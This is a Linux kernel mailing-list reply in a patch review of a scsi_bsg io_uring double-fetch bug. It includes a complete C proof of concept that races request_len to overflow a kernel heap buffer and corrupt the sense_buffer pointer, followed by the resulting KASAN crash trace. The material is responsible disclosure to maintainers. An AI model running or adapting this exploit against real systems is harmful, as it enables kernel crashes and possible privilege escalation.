Return-Path: <io-uring+bounces-13530-lists+io-uring=lfdr.de@vger.kernel.org>
Delivered-To: lists+io-uring@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id cFO0CpwZF2ov4gcAu9opvQ
	(envelope-from <io-uring+bounces-13530-lists+io-uring=lfdr.de@vger.kernel.org>)
	for <lists+io-uring@lfdr.de>; Wed, 27 May 2026 18:19:40 +0200
X-Original-To: lists+io-uring@lfdr.de
Received: from tor.lore.kernel.org (tor.lore.kernel.org [IPv6:2600:3c04:e001:36c::12fc:5321])
	by mail.lfdr.de (Postfix) with ESMTPS id 958B15E7A29
	for <lists+io-uring@lfdr.de>; Wed, 27 May 2026 18:19:38 +0200 (CEST)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by tor.lore.kernel.org (Postfix) with ESMTP id B7C3B30193A6
	for <lists+io-uring@lfdr.de>; Wed, 27 May 2026 16:19:37 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id BD52E40B6E7;
	Wed, 27 May 2026 16:19:36 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=fail reason="key not found in DNS" (0-bit key) header.d=rexion.ai header.i=@rexion.ai header.b="oZZm7b0p"
X-Original-To: io-uring@vger.kernel.org
Received: from out-13.smtp.spacemail.com (out-13.smtp.spacemail.com [63.250.43.96])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 250BA382377;
	Wed, 27 May 2026 16:19:35 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=63.250.43.96
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1779898776; cv=none; b=n0abF36EtRvWHhs+Wxt+2rUt3i8x0tIlshBPWshVU36Zk6rTRGQwz2DLRGFef2UeoiqjX5VIAlUOJ+RMBO2rBLzGBpBZWqDUP4faoB4CCZ2xzV1N4lR6wK0OTOX0/kMBtEgRQCfdk4elaLsmcihSLVdXKLJgqH/p6AsJgSou3oo=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1779898776; c=relaxed/simple;
	bh=S1tJkdyoDp2Ullzl0sv1HzmEu95/VREu6vd4iF/X7b8=;
	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
	 MIME-Version:Content-Type; b=Jg2dKblv8BQ5Epmy3rkpR6QKTII+bPhD5YA5+UFpGvEsnIF06t9cWJ+UZ/vuM7cuU+Qr2oOAuxnkDRyHtCJqc3VVUOCd2y0YI5cejX3izprMoqGen8p4zNywCobnR3xKlnJ0wqAOMwXTbJYfnyK4jPIXXKrvkVywRxwr2sQX+TQ=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=rexion.ai; spf=pass smtp.mailfrom=rexion.ai; dkim=fail (0-bit key) header.d=rexion.ai header.i=@rexion.ai header.b=oZZm7b0p reason="key not found in DNS"; arc=none smtp.client-ip=63.250.43.96
Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=rexion.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=rexion.ai
Received: from Kyren (unknown [49.207.213.66])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
	(No client certificate requested)
	by mail.spacemail.com (Postfix) with ESMTPSA id 4gQZZV0Hwfz2x98;
	Wed, 27 May 2026 16:19:29 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=rexion.ai;
	s=spacemail; t=1779898773;
	bh=q3aOJxX3UcpX51hBcAUWWpzViJsvtODvHGcSvzK7tmY=;
	h=From:To:Cc:Subject:Date:In-Reply-To:References:From;
	b=oZZm7b0pH4IgTUqhTMHn3kekARwDV8DDYO1kqIQ3zvYdGJZHG80eH/Th36Ld1LAMo
	 Kp46lI3qrKAp6lP9W/tI7zVxj4QVpn5SRhFJm8eAEjSXwAomsM1h6W8yMFHqzRNUvr
	 7WgeSZ1W82dYJnTCg180lG1U147nkPXiuL79XdsuBRr+NxHQ+wZPcS5MLDqMRDJKeH
	 /4nph4C+RdRDptjSyql3I0Ys/vLECxBURTFn8sCscRuvl5+tOw8l7UnV+wOd0Yuzp0
	 RRiBBkXevd6LaW8qCI61b40w2z7F79kdZZa9pKWLqovnYQTiewA9VdjBMrzOhf8thH
	 J6Wzbtz5ULumQ==
From: Rahul Chandelkar <rc@rexion.ai>
To: axboe@kernel.dk
Cc: James.Bottomley@HansenPartnership.com,
	martin.petersen@oracle.com,
	fujita.tomonori@lab.ntt.co.jp,
	linux-scsi@vger.kernel.org,
	linux-block@vger.kernel.org,
	io-uring@vger.kernel.org
Subject: Re: [PATCH] scsi: bsg: copy uring_cmd payload to prevent double-fetch from shared SQE
Date: Wed, 27 May 2026 21:49:26 +0530
Message-ID: <20260527161926.4071110-1-rc@rexion.ai>
X-Mailer: git-send-email 2.54.0
In-Reply-To: <ee931505-64a2-411d-8607-3db8912b70c4@kernel.dk>
References: <20260527105931.3950913-1-rc@rexion.ai> <ee931505-64a2-411d-8607-3db8912b70c4@kernel.dk>
Precedence: bulk
X-Mailing-List: io-uring@vger.kernel.org
List-Id: <io-uring.vger.kernel.org>
List-Subscribe: <mailto:io-uring+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:io-uring+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Envelope-From: rc@rexion.ai
X-Spamd-Result: default: False [-0.46 / 15.00];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
	MID_CONTAINS_FROM(1.00)[];
	R_SPF_ALLOW(-0.20)[+ip6:2600:3c04:e001:36c::/64:c];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	R_DKIM_PERMFAIL(0.00)[rexion.ai:s=spacemail];
	MIME_TRACE(0.00)[0:+];
	TAGGED_FROM(0.00)[bounces-13530-lists,io-uring=lfdr.de];
	RCVD_TLS_LAST(0.00)[];
	DMARC_NA(0.00)[rexion.ai];
	RCVD_COUNT_THREE(0.00)[4];
	DKIM_TRACE(0.00)[rexion.ai:~];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	FROM_HAS_DN(0.00)[];
	FORGED_SENDER_MAILLIST(0.00)[];
	TO_DN_NONE(0.00)[];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[rc@rexion.ai,io-uring@vger.kernel.org];
	ASN(0.00)[asn:63949, ipnet:2600:3c04::/32, country:SG];
	NEURAL_HAM(-0.00)[-0.987];
	TAGGED_RCPT(0.00)[io-uring];
	RCPT_COUNT_SEVEN(0.00)[7];
	RCVD_VIA_SMTP_AUTH(0.00)[];
	DBL_BLOCKED_OPENRESOLVER(0.00)[rctx.target:url,tor.lore.kernel.org:rdns,tor.lore.kernel.org:helo]
X-Rspamd-Queue-Id: 958B15E7A29
X-Rspamd-Action: no action
X-Rspamd-Server: lfdr

On Wed, May 27, 2026 at 10:06:44AM -0600, Jens Axboe wrote:
> I don't think this is the right way to fix it, ->sqe should've been
> stable upfront if this ends up happening. Can you share your poc with
> me? Your trace has been trimmed down way too much to be useful.

Agreed that a core-level copy before the inline callback would be the
right fix and would eliminate the entire class for every uring_cmd
driver. The per-driver copy was meant as a minimal backportable fix
for the immediate scsi_bsg path.

PoC and full trace below.

--- PoC (poc_bsg_toctou.c) ---

Build:  gcc -O2 -pthread -static -o poc poc_bsg_toctou.c
Usage:  ./poc /dev/bsg/X
Needs:  2+ CPUs, io_uring, /dev/bsg/* access

The racer thread flips request_len between 16 (passes the <=32 bounds
check) and 128 (used by copy_from_user, overflows scmd->cmnd[32]).
The overflow payload plants 0xdead000000001000 at the sense_buffer
pointer offset (+84 from cmnd[0]). When scsi_queue_rq() does
memset(scmd->sense_buffer, 0, SCSI_SENSE_BUFFERSIZE) it faults on the
corrupted pointer.

Tested on v7.1-rc1, KASAN, QEMU virtio-scsi, 2 vCPUs.

/*
 * PoC: SCSI BSG uring_cmd TOCTOU heap buffer overflow
 *
 * Overflows scmd->cmnd[32] to corrupt sense_buffer pointer.
 * On successful race, memset(corrupted_sense_buffer, 0, 96) in
 * scsi_queue_rq() causes a kernel fault proving the vulnerability.
 *
 * Usage: ./poc /dev/bsg/X
 * Build: gcc -O2 -pthread -static -o poc poc_bsg_toctou.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/io_uring.h>

struct bsg_uring_cmd {
	uint64_t request;
	uint32_t request_len;
	uint32_t protocol;
	uint32_t subprotocol;
	uint32_t max_response_len;
	uint64_t response;
	uint64_t dout_xferp;
	uint32_t dout_xfer_len;
	uint32_t dout_iovec_count;
	uint64_t din_xferp;
	uint32_t din_xfer_len;
	uint32_t din_iovec_count;
	uint32_t timeout_ms;
	uint8_t  reserved[12];
};

#define QUEUE_DEPTH   4
#define OVERFLOW_LEN  128
#define SAFE_LEN      16

static atomic_int stop_flag = 0;

static int sys_io_uring_setup(unsigned entries, struct io_uring_params *p)
{
	return syscall(__NR_io_uring_setup, entries, p);
}

static int sys_io_uring_enter(int fd, unsigned to_submit,
			      unsigned min_complete, unsigned flags)
{
	return syscall(__NR_io_uring_enter, fd, to_submit, min_complete,
		       flags, NULL, 0);
}

struct race_ctx {
	volatile uint32_t *target;
	int cpu;
};

static void *racer_thread(void *arg)
{
	struct race_ctx *ctx = arg;
	cpu_set_t cpuset;

	CPU_ZERO(&cpuset);
	CPU_SET(ctx->cpu, &cpuset);
	sched_setaffinity(0, sizeof(cpuset), &cpuset);

	while (!atomic_load_explicit(&stop_flag, memory_order_relaxed)) {
		*ctx->target = OVERFLOW_LEN;
		*ctx->target = OVERFLOW_LEN;
		*ctx->target = OVERFLOW_LEN;
		*ctx->target = OVERFLOW_LEN;
	}
	return NULL;
}

int main(int argc, char **argv)
{
	struct io_uring_params params;
	int ring_fd, bsg_fd;
	void *sq_ring, *cq_ring, *sqe_ring;
	unsigned *sq_head, *sq_tail, *sq_mask, *sq_array;
	unsigned *cq_head, *cq_tail, *cq_mask;
	size_t sqe_stride;
	pthread_t racer;
	struct race_ctx rctx;
	int i, attempts = 0;
	int max_attempts = 500000;

	if (argc < 2) {
		fprintf(stderr, "Usage: %s /dev/bsg/X\n", argv[0]);
		return 1;
	}

	bsg_fd = open(argv[1], O_RDWR);
	if (bsg_fd < 0) {
		perror("open bsg");
		return 1;
	}

	cpu_set_t cpuset;
	CPU_ZERO(&cpuset);
	CPU_SET(0, &cpuset);
	sched_setaffinity(0, sizeof(cpuset), &cpuset);

	memset(&params, 0, sizeof(params));
	params.flags = IORING_SETUP_SQE128 | IORING_SETUP_CQE32;

	ring_fd = sys_io_uring_setup(QUEUE_DEPTH, &params);
	if (ring_fd < 0) {
		perror("io_uring_setup");
		return 1;
	}

	size_t sq_ring_sz = params.sq_off.array +
			    params.sq_entries * sizeof(unsigned);
	sq_ring = mmap(NULL, sq_ring_sz, PROT_READ | PROT_WRITE,
		       MAP_SHARED | MAP_POPULATE, ring_fd, IORING_OFF_SQ_RING);

	sq_head  = sq_ring + params.sq_off.head;
	sq_tail  = sq_ring + params.sq_off.tail;
	sq_mask  = sq_ring + params.sq_off.ring_mask;
	sq_array = sq_ring + params.sq_off.array;

	sqe_stride = 2 * sizeof(struct io_uring_sqe);
	sqe_ring = mmap(NULL, params.sq_entries * sqe_stride,
			PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,
			ring_fd, IORING_OFF_SQES);

	size_t cqe_size = sizeof(struct io_uring_cqe) + 16;
	size_t cq_ring_sz = params.cq_off.cqes +
			    params.cq_entries * cqe_size;
	cq_ring = mmap(NULL, cq_ring_sz, PROT_READ | PROT_WRITE,
		       MAP_SHARED | MAP_POPULATE, ring_fd, IORING_OFF_CQ_RING);

	cq_head = cq_ring + params.cq_off.head;
	cq_tail = cq_ring + params.cq_off.tail;
	cq_mask = cq_ring + params.cq_off.ring_mask;

	unsigned char payload[OVERFLOW_LEN];
	memset(payload, 0x41, sizeof(payload));
	payload[0] = 0x12; /* INQUIRY opcode */

	uint64_t bad_sense = 0xdead000000001000ULL;
	memcpy(payload + 84, &bad_sense, 8);

	printf("[*] SCSI BSG uring_cmd TOCTOU PoC\n");
	printf("[*] Target: %s\n", argv[1]);
	printf("[*] Overflow: %d -> %d bytes (sense_buffer at +84)\n",
	       SAFE_LEN, OVERFLOW_LEN);
	printf("[*] Bad sense_buffer: 0x%lx\n", (unsigned long)bad_sense);

	rctx.cpu = 1;

	while (attempts < max_attempts) {
		unsigned tail = *sq_tail;
		unsigned idx = tail & *sq_mask;

		struct io_uring_sqe *sqe =
			(struct io_uring_sqe *)((char *)sqe_ring +
						idx * sqe_stride);
		memset(sqe, 0, sqe_stride);

		sqe->opcode = IORING_OP_URING_CMD;
		sqe->fd = bsg_fd;

		struct bsg_uring_cmd *cmd =
			(struct bsg_uring_cmd *)((char *)sqe + 48);

		cmd->request     = (uint64_t)(unsigned long)payload;
		cmd->request_len = SAFE_LEN;
		cmd->protocol    = 0;
		cmd->subprotocol = 0;
		cmd->max_response_len = 96;
		cmd->timeout_ms  = 1000;

		rctx.target = &cmd->request_len;

		if (attempts == 0) {
			pthread_create(&racer, NULL, racer_thread, &rctx);
			usleep(1000);
		}

		sq_array[idx] = idx;

		cmd->request_len = SAFE_LEN;
		__atomic_store_n(sq_tail, tail + 1, __ATOMIC_RELEASE);

		sys_io_uring_enter(ring_fd, 1, 1, IORING_ENTER_GETEVENTS);

		while (*cq_head != *cq_tail)
			__atomic_store_n(cq_head, *cq_head + 1,
					 __ATOMIC_RELEASE);

		attempts++;
		if (attempts % 50000 == 0)
			printf("[*] %d attempts...\n", attempts);
	}

	atomic_store(&stop_flag, 1);
	pthread_join(racer, NULL);

	printf("[!] %d attempts done. Check dmesg for crash.\n", attempts);

	close(bsg_fd);
	close(ring_fd);
	return 0;
}

--- Full KASAN trace (untruncated) ---

[    4.784469] ==================================================================
[    4.784815] BUG: KASAN: wild-memory-access in scsi_queue_rq+0x4a3/0x58a0
[    4.785140] Write of size 96 at addr dead000000001000 by task poc/67
[    4.785443] 
[    4.785529] CPU: 0 UID: 0 PID: 67 Comm: poc Not tainted 7.1.0-rc1 #2 PREEMPT(lazy) 
[    4.785532] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[    4.785534] Call Trace:
[    4.785536]  <TASK>
[    4.785537]  dump_stack_lvl+0x53/0x70
[    4.785540]  kasan_report+0xce/0x100
[    4.785543]  ? scsi_queue_rq+0x4a3/0x58a0
[    4.785546]  kasan_check_range+0x105/0x1b0
[    4.785549]  __asan_memset+0x23/0x50
[    4.785550]  scsi_queue_rq+0x4a3/0x58a0
[    4.785553]  ? __pfx_scsi_queue_rq+0x10/0x10
[    4.785556]  ? scsi_mq_get_budget+0xa8/0x670
[    4.785558]  blk_mq_dispatch_rq_list+0x462/0x42b0
[    4.785561]  ? blk_mq_rq_ctx_init+0x57a/0xcc0
[    4.785564]  ? __pfx_blk_mq_dispatch_rq_list+0x10/0x10
[    4.785566]  ? __pfx__raw_spin_lock+0x10/0x10
[    4.785569]  __blk_mq_sched_dispatch_requests+0x2e2/0x23a0
[    4.785574]  ? __pfx___blk_mq_sched_dispatch_requests+0x10/0x10
[    4.785580]  ? blk_mq_insert_request+0x402/0x13f0
[    4.785582]  blk_mq_sched_dispatch_requests+0xec/0x270
[    4.785584]  blk_mq_run_hw_queue+0x797/0x10e0
[    4.785586]  scsi_bsg_uring_cmd+0x942/0x1570
[    4.785588]  ? __pfx_scsi_bsg_uring_cmd+0x10/0x10
[    4.785594]  io_uring_cmd+0x2f6/0x950
[    4.785599]  __io_issue_sqe+0xb6/0xcc0
[    4.785601]  io_issue_sqe+0xe5/0x22d0
[    4.785606]  ? io_uring_cmd_prep+0x619/0xa10
[    4.785609]  io_submit_sqes+0xb4a/0x4540
[    4.785614]  __do_sys_io_uring_enter+0x148c/0x2f50
[    4.785618]  do_syscall_64+0xf9/0x540
[    4.785621]  entry_SYSCALL_64_after_hwframe+0x77/0x7f

Second fault (completion path reading corrupted sense_buffer):

[    4.799563] KASAN: maybe wild-memory-access in range [0xdead000000001000-0xdead000000001007]
[    4.800411] RIP: 0010:scsi_normalize_sense+0x47/0x480
[    4.803461] R12: dead000000001000
[    4.841254] Kernel panic - not syncing: Fatal exception in interrupt

R12 holds the corrupted sense_buffer pointer (0xdead000000001000),
confirming the overflow overwrote sense_buffer at the expected offset.

The io_submit_sqes -> io_issue_sqe -> io_uring_cmd -> scsi_bsg_uring_cmd
path shows this is the inline execution path where the SQE has not been
copied to kernel memory yet.

Rahul

